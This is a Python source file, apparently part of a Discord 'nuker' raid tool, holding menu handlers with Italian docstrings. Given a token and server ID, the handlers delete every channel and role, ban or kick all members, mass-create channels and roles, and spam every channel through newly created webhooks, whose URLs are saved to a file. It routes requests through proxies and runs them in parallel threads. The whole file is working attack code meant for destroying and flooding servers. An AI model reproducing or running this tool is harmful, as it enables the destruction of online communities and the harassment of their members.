from threading import Thread
import time
from typing import List, Dict
import requests as req
from Plugins.logger import Logger
from Plugins.colors import Palette
from Plugins.tools import Tools
from colorama import Fore


class MenuHandlers:
    def __init__(self, nuker, token: str, guild_id: str, headers: Dict[str, str], global_timeot: float = 0.0001):
        self.nuker = nuker
        self.token = token
        self.guild_id = guild_id
        self.headers = headers
        self.global_timeot = global_timeot
        self.palette = Palette()
        self.names = None
        self.amount = None
        self.invite_link = None
        self.guild_name = None

    async def handle_delete_channels(self) -> None:
        """Handler per l'opzione 01 - Delete All Channels"""
        url = Tools.api(f"guilds/{self.guild_id}/channels")
        request = req.get(url, headers=self.headers, proxies=Tools.proxy())

        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels with status code: {request.status_code}")
            return await self.back_to_menu()

        channels = [i["id"] for i in request.json()]
        threads = []

        Logger.Log.started()

        for channel in channels:
            t = Thread(target=self._delete_channel, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()

        return await self.back_to_menu()

    async def handle_delete_roles(self) -> None:
        """Handler per l'opzione 02 - Delete All Roles"""
        url = Tools.api(f"guilds/{self.guild_id}/roles")
        request = req.get(url, headers=self.headers)

        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch roles with status code: {request.status_code}")
            return await self.back_to_menu()

        roles = [i["id"] for i in request.json()]
        threads = []

        Logger.Log.started()

        for role in roles:
            t = Thread(target=self._delete_role, args=(role,))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()

        return await self.back_to_menu()

    async def handle_ban_members(self) -> None:
        """Handler per l'opzione 03 - Ban All Members"""
        api = Tools.api(f"/guilds/{self.guild_id}/members")
        users = await Tools.break_limit(api, self.token)

        members = self._split_members(users)
        Logger.Log.started()

        while any(len(m) > 0 for m in members):
            for member_list in members:
                if member_list:
                    Thread(target=self._ban_member, args=(member_list[0],)).start()
                    member_list.pop(0)

        return await self.back_to_menu()

    async def handle_kick_members(self) -> None:
        """Handler per l'opzione 04 - Kick All Members"""
        api = Tools.api(f"/guilds/{self.guild_id}/members")
        users = await Tools.break_limit(api, self.token)

        members = self._split_members(users)
        Logger.Log.started()

        while any(len(m) > 0 for m in members):
            for member_list in members:
                if member_list:
                    Thread(target=self._kick_member, args=(member_list[0],)).start()
                    member_list.pop(0)

        return await self.back_to_menu()

    async def handle_create_channels(self) -> None:
        """Handler per l'opzione 05 - Create Channels"""
        name = self._get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
        count = int(self._get_input("How many channels do you want to create? [1,500]: ",
                                    lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500))
        channel_type = self._get_input("Enter the type of the channels: [text, voice]: ",
                                       lambda x: x.lower().strip() in ["text", "voice"])

        types = {"voice": 2, "text": 0}
        Logger.Log.started()
        threads = []

        for _ in range(count):
            t = Thread(target=self._create_channel, args=(name, types[channel_type]))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()
        return await self.back_to_menu()

    async def handle_create_roles(self) -> None:
        """Handler per l'opzione 06 - Create Roles"""
        name = self._get_input("Enter a name for roles: ", lambda x: len(x) < 100 and x != "")
        count = int(self._get_input("How many roles do you want to create? [1,250]: ",
                                    lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 250))

        Logger.Log.started()
        threads = []

        for _ in range(count):
            t = Thread(target=self._create_role, args=(name,))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()
        return await self.back_to_menu()

    async def handle_unban_all(self) -> None:
        """Handler per l'opzione 07 - Unban All Members"""
        url = Tools.api(f"/guilds/{self.guild_id}/bans")
        banned_users = await Tools.break_limit(url, self.token)

        Logger.Log.started()
        threads = []

        for banned in banned_users:
            t = Thread(target=self._unban_member, args=(banned,))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()
        return await self.back_to_menu()

    async def handle_webhook_spam(self) -> None:
        """Handler per l'opzione 08 - Webhook Spam Guild"""
        url = Tools.api(f"/guilds/{self.guild_id}/channels")
        message = self._get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
        count = int(self._get_input("how many times do you want to send this message? [1, ∞]: ",
                                    lambda x: x.isnumeric() and int(x) != 0))

        request = req.get(url, headers=self.headers)
        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels: {request.status_code}")
            return await self.back_to_menu()

        channels = [i["id"] for i in request.json()]
        chunk_size = round(len(channels) / 2)
        channels = Tools.chunker(channels, chunk_size)

        Logger.Log.started()
        threads = []

        for channel_list in channels:
            t = Thread(target=self._mass_webhook, args=(channel_list, message, count))
            t.start()
            threads.append(t)
            time.sleep(self.global_timeot)

        for thread in threads:
            thread.join()
        return await self.back_to_menu()

    # ... Implementa gli altri handlers similmente

    def _split_members(self, members: List[str], chunks: int = 6) -> List[List[str]]:
        """Divide i membri in chunks"""
        total = len(members)
        per_chunk = round(total / chunks)
        result = [[] for _ in range(chunks)]

        for member in members:
            for chunk in result:
                if len(chunk) < per_chunk:
                    chunk.append(member)
                    break
        return result

    def _get_input(self, prompt: str, checker: callable) -> str:
        """Wrapper per input con validazione"""
        while True:
            value = input(prompt)
            if checker(value):
                return value

    # Helper methods per le operazioni
    def _delete_channel(self, channel_id: str) -> None:
        if self.nuker.delete_channel(channel_id):
            Logger.Success.delete(channel_id)
        else:
            Logger.Error.delete(channel_id)

    def _delete_role(self, role_id: str) -> None:
        if self.nuker.delete_role(role_id):
            Logger.Success.delete(role_id)
        else:
            Logger.Error.delete(role_id)

    def _ban_member(self, member_id: str) -> None:
        if self.nuker.ban(member_id):
            Logger.Success.success(f"Banned {Fore.YELLOW}{member_id}")
        else:
            Logger.Error.error(f"Failed to ban {Fore.RED}{member_id}")

    def _kick_member(self, member_id: str) -> None:
        if self.nuker.kick(member_id):
            Logger.Success.success(f"Kicked {Fore.YELLOW}{member_id}")
        else:
            Logger.Error.error(f"Failed to kick {Fore.RED}{member_id}")

    def _create_channel(self, name: str, channel_type: int) -> None:
        status = self.nuker.create_channel(name, channel_type)
        if status:
            Logger.Success.create(status)
        else:
            Logger.Error.create(name)

    def _create_role(self, name: str) -> None:
        status = self.nuker.create_role(name)
        if status:
            Logger.Success.create(status)
        else:
            Logger.Error.create(name)

    def _unban_member(self, member_id: str) -> None:
        if self.nuker.unban(member_id):
            Logger.Success.success(f"Unbanned {member_id}")
        else:
            Logger.Error.error(f"Failed to unban {member_id}")

    def _mass_webhook(self, channels: List[str], message: str, count: int) -> None:
        for channel in channels:
            status = self.nuker.create_webhook(channel)
            if status:
                Logger.Success.create(status)
                with open("./Scraped/webhooks.txt", "a") as fp:
                    fp.write(f"{status}\n")
                Thread(target=self.nuker.send_webhook, args=(status, message, count)).start()
            else:
                Logger.Error.error(f"Failed to create webhook in {channel}")

    async def back_to_menu(self) -> None:
        """Handler per tornare al menu principale"""
        input(f"{self.palette.error}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{self.palette.fuck}\n")